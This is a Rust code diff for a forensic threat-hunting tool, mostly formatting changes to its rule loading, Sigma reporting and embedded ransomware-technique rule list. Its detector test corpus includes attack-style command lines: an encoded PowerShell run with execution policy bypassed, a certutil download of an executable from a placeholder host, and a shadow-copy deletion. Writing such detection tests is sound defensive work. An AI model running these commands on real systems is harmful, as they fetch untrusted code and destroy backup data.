@@ -9,12 +9,13 @@
 //! A rule pack ships in `rules/` mapping the financially-motivated-actor TTPs
 //! this tool targets.
 
+pub mod attack;
 pub mod correlation;
 pub mod event_rule;
 pub mod import;
 pub mod ioc;
-pub mod sigma;
 pub mod report;
+pub mod sigma;
 
 use correlation::{detection_from_row, CorrelationRule};
 use event_rule::EventRule;
@@ -51,7 +52,8 @@ impl RuleSet {
         let entries = match std::fs::read_dir(dir) {
             Ok(e) => e,
             Err(e) => {
-                set.load_errors.push(format!("read rules dir {}: {e}", dir.display()));
+                set.load_errors
+                    .push(format!("read rules dir {}: {e}", dir.display()));
                 return set;
             }
         };
@@ -63,7 +65,9 @@ impl RuleSet {
             }
             match std::fs::read_to_string(&path) {
                 Ok(text) => set.load_str(&text, &path.display().to_string()),
-                Err(e) => set.load_errors.push(format!("read {}: {e}", path.display())),
+                Err(e) => set
+                    .load_errors
+                    .push(format!("read {}: {e}", path.display())),
             }
         }
         set
@@ -78,7 +82,8 @@ impl RuleSet {
         let kind = match serde_yaml::from_str::<Kind>(text) {
             Ok(k) => k.kind,
             Err(e) => {
-                self.load_errors.push(format!("{origin}: missing/invalid `kind`: {e}"));
+                self.load_errors
+                    .push(format!("{origin}: missing/invalid `kind`: {e}"));
                 return;
             }
         };
@@ -145,6 +150,7 @@ pub fn run(store: &CaseStore, rules: &RuleSet) -> HuntReport {
                         row.first_ts,
                         row.event_ids,
                         row.magnitude,
+                        &row.host,
                     ));
                 }
             }
@@ -176,7 +182,11 @@ pub fn run(store: &CaseStore, rules: &RuleSet) -> HuntReport {
 /// set. Rules are pre-compiled into one combined matcher per event field (see
 /// `CompiledRules`), so hundreds or thousands of rules cost about the same per
 /// event as tens.
-fn scan_events(store: &CaseStore, ev_rules: &[EventRule], engine: DetectionEngine) -> (Vec<Detection>, Option<String>) {
+fn scan_events(
+    store: &CaseStore,
+    ev_rules: &[EventRule],
+    engine: DetectionEngine,
+) -> (Vec<Detection>, Option<String>) {
     let mut detections: Vec<Detection> = Vec::new();
     // Parse `raw` per row only if some loaded rule reads a raw-backed field
     // (event.id / extras.* / Sigma EventData fields).
@@ -186,7 +196,8 @@ fn scan_events(store: &CaseStore, ev_rules: &[EventRule], engine: DetectionEngin
     // same (rule, evidence file, MFT record) into a single finding: earliest
     // timestamp, all contributing event ids. Scoped to MFT on purpose — other
     // parsers can share a source_ref across genuinely distinct entries.
-    let mut mft_seen: std::collections::HashMap<(String, Uuid, String), usize> = std::collections::HashMap::new();
+    let mut mft_seen: std::collections::HashMap<(String, Uuid, String), usize> =
+        std::collections::HashMap::new();
     let mut compiled = crate::event_rule::GatedRules::new(ev_rules);
     let mut hit_buf: Vec<bool> = Vec::new();
     let mut matched: Vec<usize> = Vec::new();
@@ -198,20 +209,27 @@ fn scan_events(store: &CaseStore, ev_rules: &[EventRule], engine: DetectionEngin
     let per_art = compiled.rules_per_artefact();
     let weight = |art: &str| -> u64 {
         let l = art.to_ascii_lowercase();
-        let raw = if needs_raw && (l == "evtx" || l == "browserhistory") { 25 } else { 0 };
+        let raw = if needs_raw && (l == "evtx" || l == "browserhistory") {
+            25
+        } else {
+            0
+        };
         1 + *per_art.get(&l).unwrap_or(&0) as u64 + raw
     };
     if let Ok(counts) = store.counts_by_artefact() {
         fx_core::progress::set_work_total(counts.iter().map(|(a, n)| n * weight(a)).sum());
     }
-    let mut wcache: std::collections::HashMap<fx_core::ArtefactKind, u64> = std::collections::HashMap::new();
+    let mut wcache: std::collections::HashMap<fx_core::ArtefactKind, u64> =
+        std::collections::HashMap::new();
     let mut work: u64 = 0;
     let mut tick: u64 = 0;
     let mut stopped = false;
     let scan = store.for_each_event(needs_raw, |ev| {
         // Progress + cancel, checked every 4096 events to keep the hot loop cheap.
         tick += 1;
-        work += *wcache.entry(ev.artefact).or_insert_with(|| weight(&format!("{:?}", ev.artefact)));
+        work += *wcache
+            .entry(ev.artefact)
+            .or_insert_with(|| weight(&format!("{:?}", ev.artefact)));
         if tick & 4095 == 0 {
             fx_core::progress::add_scanned(4096);
             fx_core::progress::add_work(work);
@@ -228,7 +246,11 @@ fn scan_events(store: &CaseStore, ev_rules: &[EventRule], engine: DetectionEngin
             // their own and include paged-out AV signatures: fold every hit
             // of a rule in one file into a single finding, capped at medium.
             if ev.artefact == fx_core::ArtefactKind::Pagefile {
-                let key = (rule.id.clone(), ev.provenance.evidence_id, "pagefile".to_string());
+                let key = (
+                    rule.id.clone(),
+                    ev.provenance.evidence_id,
+                    "pagefile".to_string(),
+                );
                 if let Some(&idx) = mft_seen.get(&key) {
                     let d: &mut Detection = &mut detections[idx];
                     if d.event_ids.len() < 500 {
@@ -295,7 +317,10 @@ fn scan_events(store: &CaseStore, ev_rules: &[EventRule], engine: DetectionEngin
             }
         }
     }
-    (detections, scan.err().map(|e| format!("single-event scan: {e}")))
+    (
+        detections,
+        scan.err().map(|e| format!("single-event scan: {e}")),
+    )
 }
 
 /// Per-rule outcome of a Sigma run.
@@ -343,42 +368,59 @@ pub fn run_sigma(store: &CaseStore, folder: &str, load: &sigma::SigmaLoad) -> Si
             errors.push(e);
         }
     }
-    dets.sort_by(|a, b| b.severity.cmp(&a.severity).then(a.timestamp.cmp(&b.timestamp)));
+    dets.sort_by(|a, b| {
+        b.severity
+            .cmp(&a.severity)
+            .then(a.timestamp.cmp(&b.timestamp))
+    });
     fx_core::progress::set_phase(&format!("Saving {} Sigma findings", dets.len()));
     if let Err(e) = store.replace_sigma_detections(&dets) {
         errors.push(format!("persist Sigma findings: {e}"));
     }
     let fmt = time::macros::format_description!("[year]-[month]-[day]T[hour]:[minute]:[second]");
-    let mut by_rule: std::collections::BTreeMap<String, SigmaRuleHit> = std::collections::BTreeMap::new();
+    let mut by_rule: std::collections::BTreeMap<String, SigmaRuleHit> =
+        std::collections::BTreeMap::new();
     for d in &dets {
         let meta = load.meta.get(&d.rule_id);
         let ts = d.timestamp.format(&fmt).ok();
-        let h = by_rule.entry(d.rule_id.clone()).or_insert_with(|| SigmaRuleHit {
-            rule_id: d.rule_id.clone(),
-            sigma_id: meta.map(|m| m.sigma_id.clone()).unwrap_or_default(),
-            title: d.title.clone(),
-            level: meta.map(|m| m.level.clone()).unwrap_or_default(),
-            author: meta.map(|m| m.author.clone()).unwrap_or_default(),
-            logsource: meta.map(|m| m.logsource.clone()).unwrap_or_default(),
-            findings: 0,
-            events: 0,
-            first_seen: None,
-            last_seen: None,
-        });
+        let h = by_rule
+            .entry(d.rule_id.clone())
+            .or_insert_with(|| SigmaRuleHit {
+                rule_id: d.rule_id.clone(),
+                sigma_id: meta.map(|m| m.sigma_id.clone()).unwrap_or_default(),
+                title: d.title.clone(),
+                level: meta.map(|m| m.level.clone()).unwrap_or_default(),
+                author: meta.map(|m| m.author.clone()).unwrap_or_default(),
+                logsource: meta.map(|m| m.logsource.clone()).unwrap_or_default(),
+                findings: 0,
+                events: 0,
+                first_seen: None,
+                last_seen: None,
+            });
         h.findings += 1;
         h.events += d.event_ids.len();
         if let Some(t) = ts {
-            if h.first_seen.as_ref().map_or(true, |f| &t < f) {
+            if h.first_seen.as_ref().is_none_or(|f| &t < f) {
                 h.first_seen = Some(t.clone());
             }
-            if h.last_seen.as_ref().map_or(true, |l| &t > l) {
+            if h.last_seen.as_ref().is_none_or(|l| &t > l) {
                 h.last_seen = Some(t);
             }
         }
     }
-    let rank = |l: &str| match l { "critical" => 0, "high" => 1, "medium" => 2, "low" => 3, _ => 4 };
+    let rank = |l: &str| match l {
+        "critical" => 0,
+        "high" => 1,
+        "medium" => 2,
+        "low" => 3,
+        _ => 4,
+    };
     let mut hits: Vec<SigmaRuleHit> = by_rule.into_values().collect();
-    hits.sort_by(|a, b| rank(&a.level).cmp(&rank(&b.level)).then(b.findings.cmp(&a.findings)));
+    hits.sort_by(|a, b| {
+        rank(&a.level)
+            .cmp(&rank(&b.level))
+            .then(b.findings.cmp(&a.findings))
+    });
     SigmaRunReport {
         folder: folder.to_string(),
         loaded: load.loaded,
@@ -431,45 +473,155 @@ pub fn severity_rank(s: Severity) -> u8 {
 /// Every rule file shipped with the tool, compiled into the binary via
 /// include_str! (paths relative to this source file: ../rules/).
 static EMBEDDED_RULES: &[(&str, &str)] = &[
-    ("credential_access_lsass.yml", include_str!("../rules/credential_access_lsass.yml")),
-    ("credential_access_secrets.yml", include_str!("../rules/credential_access_secrets.yml")),
-    ("data_staging_tools.yml", include_str!("../rules/data_staging_tools.yml")),
-    ("defender_asr_block.yml", include_str!("../rules/defender_asr_block.yml")),
-    ("defender_detections.yml", include_str!("../rules/defender_detections.yml")),
-    ("defender_tampering.yml", include_str!("../rules/defender_tampering.yml")),
-    ("office_macros_enabled.yml", include_str!("../rules/office_macros_enabled.yml")),
-    ("user_search_sensitive_terms.yml", include_str!("../rules/user_search_sensitive_terms.yml")),
-    ("user_admin_share_access.yml", include_str!("../rules/user_admin_share_access.yml")),
-    ("defense_evasion_indicators.yml", include_str!("../rules/defense_evasion_indicators.yml")),
-    ("discovery_recon_commands.yml", include_str!("../rules/discovery_recon_commands.yml")),
-    ("execution_lolbin_abuse.yml", include_str!("../rules/execution_lolbin_abuse.yml")),
-    ("execution_powershell_suspicious.yml", include_str!("../rules/execution_powershell_suspicious.yml")),
-    ("group_akira_ttps.yml", include_str!("../rules/group_akira_ttps.yml")),
-    ("group_inc_ransom_ttps.yml", include_str!("../rules/group_inc_ransom_ttps.yml")),
-    ("group_interlock_ttps.yml", include_str!("../rules/group_interlock_ttps.yml")),
-    ("group_lockbit_clop_ttps.yml", include_str!("../rules/group_lockbit_clop_ttps.yml")),
-    ("group_play_dragonforce_ttps.yml", include_str!("../rules/group_play_dragonforce_ttps.yml")),
-    ("group_qilin_ttps.yml", include_str!("../rules/group_qilin_ttps.yml")),
-    ("group_thegentlemen_ttps.yml", include_str!("../rules/group_thegentlemen_ttps.yml")),
-    ("lateral_movement_remote_exec.yml", include_str!("../rules/lateral_movement_remote_exec.yml")),
-    ("mass_rename_ransomware.yml", include_str!("../rules/mass_rename_ransomware.yml")),
-    ("offensive_tooling.yml", include_str!("../rules/offensive_tooling.yml")),
-    ("persistence_autostart_hijack.yml", include_str!("../rules/persistence_autostart_hijack.yml")),
-    ("persistence_mechanisms.yml", include_str!("../rules/persistence_mechanisms.yml")),
-    ("ransomware_shared_tooling.yml", include_str!("../rules/ransomware_shared_tooling.yml")),
-    ("rdp_outbound_history.yml", include_str!("../rules/rdp_outbound_history.yml")),
-    ("rdp_then_tooling.yml", include_str!("../rules/rdp_then_tooling.yml")),
-    ("remote_access_session.yml", include_str!("../rules/remote_access_session.yml")),
-    ("remote_access_transfer_or_command.yml", include_str!("../rules/remote_access_transfer_or_command.yml")),
-    ("rmm_tool_execution.yml", include_str!("../rules/rmm_tool_execution.yml")),
-    ("runmru_hands_on_keyboard.yml", include_str!("../rules/runmru_hands_on_keyboard.yml")),
-    ("shadow_copy_deletion.yml", include_str!("../rules/shadow_copy_deletion.yml")),
-    ("srum_bulk_exfil.yml", include_str!("../rules/srum_bulk_exfil.yml")),
-    ("suspicious_parent_child.yml", include_str!("../rules/suspicious_parent_child.yml")),
-    ("suspicious_scheduled_task.yml", include_str!("../rules/suspicious_scheduled_task.yml")),
-    ("system_binary_masquerade.yml", include_str!("../rules/system_binary_masquerade.yml")),
+    (
+        "credential_access_lsass.yml",
+        include_str!("../rules/credential_access_lsass.yml"),
+    ),
+    (
+        "credential_access_secrets.yml",
+        include_str!("../rules/credential_access_secrets.yml"),
+    ),
+    (
+        "data_staging_tools.yml",
+        include_str!("../rules/data_staging_tools.yml"),
+    ),
+    (
+        "defender_asr_block.yml",
+        include_str!("../rules/defender_asr_block.yml"),
+    ),
+    (
+        "defender_detections.yml",
+        include_str!("../rules/defender_detections.yml"),
+    ),
+    (
+        "defender_tampering.yml",
+        include_str!("../rules/defender_tampering.yml"),
+    ),
+    (
+        "office_macros_enabled.yml",
+        include_str!("../rules/office_macros_enabled.yml"),
+    ),
+    (
+        "user_search_sensitive_terms.yml",
+        include_str!("../rules/user_search_sensitive_terms.yml"),
+    ),
+    (
+        "user_admin_share_access.yml",
+        include_str!("../rules/user_admin_share_access.yml"),
+    ),
+    (
+        "defense_evasion_indicators.yml",
+        include_str!("../rules/defense_evasion_indicators.yml"),
+    ),
+    (
+        "discovery_recon_commands.yml",
+        include_str!("../rules/discovery_recon_commands.yml"),
+    ),
+    (
+        "execution_lolbin_abuse.yml",
+        include_str!("../rules/execution_lolbin_abuse.yml"),
+    ),
+    (
+        "execution_powershell_suspicious.yml",
+        include_str!("../rules/execution_powershell_suspicious.yml"),
+    ),
+    (
+        "group_akira_ttps.yml",
+        include_str!("../rules/group_akira_ttps.yml"),
+    ),
+    (
+        "group_inc_ransom_ttps.yml",
+        include_str!("../rules/group_inc_ransom_ttps.yml"),
+    ),
+    (
+        "group_interlock_ttps.yml",
+        include_str!("../rules/group_interlock_ttps.yml"),
+    ),
+    (
+        "group_lockbit_clop_ttps.yml",
+        include_str!("../rules/group_lockbit_clop_ttps.yml"),
+    ),
+    (
+        "group_play_dragonforce_ttps.yml",
+        include_str!("../rules/group_play_dragonforce_ttps.yml"),
+    ),
+    (
+        "group_qilin_ttps.yml",
+        include_str!("../rules/group_qilin_ttps.yml"),
+    ),
+    (
+        "group_thegentlemen_ttps.yml",
+        include_str!("../rules/group_thegentlemen_ttps.yml"),
+    ),
+    (
+        "lateral_movement_remote_exec.yml",
+        include_str!("../rules/lateral_movement_remote_exec.yml"),
+    ),
+    (
+        "mass_rename_ransomware.yml",
+        include_str!("../rules/mass_rename_ransomware.yml"),
+    ),
+    (
+        "offensive_tooling.yml",
+        include_str!("../rules/offensive_tooling.yml"),
+    ),
+    (
+        "persistence_autostart_hijack.yml",
+        include_str!("../rules/persistence_autostart_hijack.yml"),
+    ),
+    (
+        "persistence_mechanisms.yml",
+        include_str!("../rules/persistence_mechanisms.yml"),
+    ),
+    (
+        "ransomware_shared_tooling.yml",
+        include_str!("../rules/ransomware_shared_tooling.yml"),
+    ),
+    (
+        "rdp_outbound_history.yml",
+        include_str!("../rules/rdp_outbound_history.yml"),
+    ),
+    (
+        "rdp_then_tooling.yml",
+        include_str!("../rules/rdp_then_tooling.yml"),
+    ),
+    (
+        "remote_access_session.yml",
+        include_str!("../rules/remote_access_session.yml"),
+    ),
+    (
+        "remote_access_transfer_or_command.yml",
+        include_str!("../rules/remote_access_transfer_or_command.yml"),
+    ),
+    (
+        "rmm_tool_execution.yml",
+        include_str!("../rules/rmm_tool_execution.yml"),
+    ),
+    (
+        "runmru_hands_on_keyboard.yml",
+        include_str!("../rules/runmru_hands_on_keyboard.yml"),
+    ),
+    (
+        "shadow_copy_deletion.yml",
+        include_str!("../rules/shadow_copy_deletion.yml"),
+    ),
+    (
+        "srum_bulk_exfil.yml",
+        include_str!("../rules/srum_bulk_exfil.yml"),
+    ),
+    (
+        "suspicious_parent_child.yml",
+        include_str!("../rules/suspicious_parent_child.yml"),
+    ),
+    (
+        "suspicious_scheduled_task.yml",
+        include_str!("../rules/suspicious_scheduled_task.yml"),
+    ),
+    (
+        "system_binary_masquerade.yml",
+        include_str!("../rules/system_binary_masquerade.yml"),
+    ),
 ];
-
 
 #[cfg(test)]
 mod embedded_rules_tests {
@@ -486,8 +638,10 @@ mod embedded_rules_tests {
             .filter(|n| n.ends_with(".yml"))
             .collect();
         on_disk.sort();
-        let mut embedded: Vec<String> =
-            super::EMBEDDED_RULES.iter().map(|(n, _)| n.to_string()).collect();
+        let mut embedded: Vec<String> = super::EMBEDDED_RULES
+            .iter()
+            .map(|(n, _)| n.to_string())
+            .collect();
         embedded.sort();
         assert_eq!(on_disk, embedded, "rules/ and EMBEDDED_RULES differ");
     }
@@ -514,7 +668,12 @@ mod embedded_rules_tests {
                     if old != new {
                         failures.push(format!("{}: engines disagree on {:?}", r.id, ex));
                     } else if old != want {
-                        failures.push(format!("{}: expected {} on {:?}", r.id, if want { "match" } else { "no match" }, ex));
+                        failures.push(format!(
+                            "{}: expected {} on {:?}",
+                            r.id,
+                            if want { "match" } else { "no match" },
+                            ex
+                        ));
                     }
                 }
             }
@@ -524,19 +683,36 @@ mod embedded_rules_tests {
         let mut corpus: Vec<String> = vec![
             r"C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule".into(),
             r"powershell.exe -NoProfile -ExecutionPolicy Bypass -enc SQBFAFgA".into(),
-            r"C:\PerfLogs\a.exe".into(), r"certutil -urlcache -f http://x/y.exe y.exe".into(),
-            r"vssadmin delete shadows /all /quiet".into(), "process.start".into(), "".into(),
+            r"C:\PerfLogs\a.exe".into(),
+            r"certutil -urlcache -f http://x/y.exe y.exe".into(),
+            r"vssadmin delete shadows /all /quiet".into(),
+            "process.start".into(),
+            "".into(),
         ];
         fn lits(c: &crate::event_rule::Condition, out: &mut Vec<String>) {
             use crate::event_rule::Condition::*;
-            match c { All { all } => all.iter().for_each(|x| lits(x, out)), Any { any } => any.iter().for_each(|x| lits(x, out)),
-                      Not { not } => lits(not, out), Match { match_ } => out.extend(match_.values.iter().cloned()) }
+            match c {
+                All { all } => all.iter().for_each(|x| lits(x, out)),
+                Any { any } => any.iter().for_each(|x| lits(x, out)),
+                Not { not } => lits(not, out),
+                Match { match_ } => out.extend(match_.values.iter().cloned()),
+            }
         }
-        for r in rules { lits(&r.detection, &mut corpus); }
+        for r in rules {
+            lits(&r.detection, &mut corpus);
+        }
         let mut gated = crate::event_rule::GatedRules::new(rules);
         let (mut gh, mut go) = (Vec::new(), Vec::new());
         for v in &corpus {
-            for field in ["process.command_line", "process.name", "process.path", "target.path", "message", "action", "process.parent_name"] {
+            for field in [
+                "process.command_line",
+                "process.name",
+                "process.path",
+                "target.path",
+                "message",
+                "action",
+                "process.parent_name",
+            ] {
                 for art in ["evtx", "mft", "prefetch"] {
                     let mut ex = std::collections::BTreeMap::new();
                     ex.insert(field.to_string(), v.clone());
@@ -545,8 +721,13 @@ mod embedded_rules_tests {
                     compiled.matching(&ev, &mut hit, &mut out);
                     gated.matching(&ev, &mut gh, &mut go);
                     for (ri, r2) in rules.iter().enumerate() {
-                        if r2.matches(&ev) != out.contains(&ri) || out.contains(&ri) != go.contains(&ri) {
-                            failures.push(format!("{}: engines disagree on {field}={v:?} ({art})", r2.id));
+                        if r2.matches(&ev) != out.contains(&ri)
+                            || out.contains(&ri) != go.contains(&ri)
+                        {
+                            failures.push(format!(
+                                "{}: engines disagree on {field}={v:?} ({art})",
+                                r2.id
+                            ));
                         }
                     }
                 }
@@ -558,19 +739,32 @@ mod embedded_rules_tests {
                 compiled.matching(&ev, &mut hit, &mut out);
                 for (ri, r2) in rules.iter().enumerate() {
                     if r2.matches(&ev) != out.contains(&ri) {
-                        failures.push(format!("{} vs example of {}: engines disagree", r2.id, r.id));
+                        failures.push(format!(
+                            "{} vs example of {}: engines disagree",
+                            r2.id, r.id
+                        ));
                     }
                 }
             }
         }
-        assert!(failures.is_empty(), "{} of {} examples failed:\n{}", failures.len(), examples, failures.join("\n"));
+        assert!(
+            failures.is_empty(),
+            "{} of {} examples failed:\n{}",
+            failures.len(),
+            examples,
+            failures.join("\n")
+        );
     }
 
     /// Every embedded rule must parse.
     #[test]
     fn embedded_rules_all_load() {
         let rs = super::RuleSet::from_embedded();
-        assert!(rs.load_errors.is_empty(), "rule load errors: {:?}", rs.load_errors);
+        assert!(
+            rs.load_errors.is_empty(),
+            "rule load errors: {:?}",
+            rs.load_errors
+        );
         assert_eq!(rs.len(), super::EMBEDDED_RULES.len());
     }
 }
